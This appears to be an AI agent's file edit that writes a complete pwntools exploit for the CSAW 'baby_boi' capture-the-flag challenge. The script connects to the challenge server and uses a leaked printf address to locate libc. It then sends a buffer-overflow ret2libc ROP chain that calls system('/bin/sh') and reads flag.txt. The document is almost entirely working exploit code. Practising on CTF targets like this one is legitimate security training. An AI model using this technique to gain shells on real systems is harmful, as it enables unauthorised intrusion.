edit 1:1
from pwn import *

context.binary = "./baby_boi"
elf = ELF("./baby_boi")
libc = ELF("./libc-2.27.so")

p = remote("pwn.chal.csaw.io", 8000)

p.recvline()
line = p.recvline().decode().strip()
leak = int(line.split()[-1], 16)

libc.address = leak - libc.symbols["printf"]

pop_rdi = 0x400793
ret = 0x400794
binsh = next(libc.search(b"/bin/sh\x00"))
system = libc.symbols["system"]

payload = b"A" * 40
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

p.sendline(payload)
p.sendline(b"cat flag.txt")
print(p.recvall(timeout=3).decode("latin-1", errors="ignore"))
end_of_edit

